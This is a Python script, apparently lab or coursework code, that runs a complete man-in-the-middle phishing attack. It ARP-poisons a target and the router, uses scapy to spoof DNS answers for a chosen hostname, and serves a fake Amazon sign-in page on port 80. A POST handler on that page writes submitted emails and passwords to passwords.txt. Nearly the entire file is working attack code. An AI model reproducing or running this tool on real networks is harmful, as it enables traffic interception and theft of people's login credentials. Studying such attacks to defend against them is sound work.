from scapy.all import *
from multiprocessing import Process
import SimpleHTTPServer
import SocketServer
import time
import cgi

TARGET_IP = "192.168.0.25"
SENDER_IP = "192.168.0.24"
SENDER_MAC = "98:90:96:dc:f2:de"
ROUTER_IP = "192.168.0.100"
DNS_TARGET = "hellokitty"

##-------------------------------------------------------------
# method for creating packets for ARP spoofing
##-------------------------------------------------------------
def create_arp_packets():
    packet1 = ARP(op='who-has', hwsrc=SENDER_MAC, psrc=ROUTER_IP,  pdst=TARGET_IP)
    packet2 = ARP(op='who-has', hwsrc=SENDER_MAC, psrc=TARGET_IP,  pdst=ROUTER_IP)
    return packet1, packet2


##-------------------------------------------------------------
# method for arp spoofing
# sends packets to router and target machine
##-------------------------------------------------------------
def runspoof():
    target_p, router_p = create_arp_packets()
    print "ARP Posioning Thread Started"
    # Send out both packets
    while 1:
        time.sleep(1)
        send(target_p, verbose=0)
        send(router_p, verbose=0)


##-------------------------------------------------------------
# method to run packet sniffer
##-------------------------------------------------------------
def spoof_dns():
    print "DNS Spoofing Thread Started"
    sniff(filter="udp and port 53 and src " + TARGET_IP, prn=parse)
    # look for dns packets from target

##-------------------------------------------------------------
# method for parsing packet captured with sniff function
# When DNS packet is arrived, send back a fake DNS answer
# packet
##-------------------------------------------------------------
def parse(pkt):
    ip = pkt.getlayer(IP)
    dnslayer = pkt.getlayer(DNS)
    if pkt.haslayer(DNS) and ip.src == TARGET_IP and DNS_TARGET in dnslayer.qd.qname:
        ans = DNSRR(rrname=dnslayer.qd.qname, ttl=10, rdata=SENDER_IP)
        dns = DNS(id=dnslayer.id, qr=1, qd=pkt.getlayer(DNS).qd, an=ans)
        packet = IP(src=ip.dst, dst=ip.src) / UDP(dport=ip.sport, sport=ip.dport) / dns
        send(packet, verbose=0)

##-------------------------------------------------------------
# Class for handling POST request sent on web server
# Values entered in mail address and password field is stored in
# passwords.txt
# This class is used in run_web_server function
##-------------------------------------------------------------
class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            print item
        with open("passwords.txt", "a") as f:
            for item in form.list:
                f.write(str(item) + "\n")
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

##-------------------------------------------------------------
# method for running web server on port 80
# fake amazon sign-in page is displayed on the site
# html file is in index.html
##-------------------------------------------------------------
def run_web_server():
    PORT = 80
    Handler = ServerHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "serving at port", PORT
    httpd.serve_forever()

##-------------------------------------------------------------
# main method
# creates three processes for ARP spoofing, DNS spoofing and
# web server
##-------------------------------------------------------------
def main():
    # Enable IP forwarding
    # 'echo 1 > /proc/sys/net/ipv4/ip_forward'
    p = Process(target=runspoof, args=())
    p1 = Process(target=spoof_dns, args=())
    p2 = Process(target=run_web_server, args=())
    p.start()
    p1.start()
    p2.start()
    p.join()
    p1.join()
    p2.join()
    #  `echo 0 > /proc/sys/net/ipv4/ip_forward`


if __name__ == '__main__':
    main()
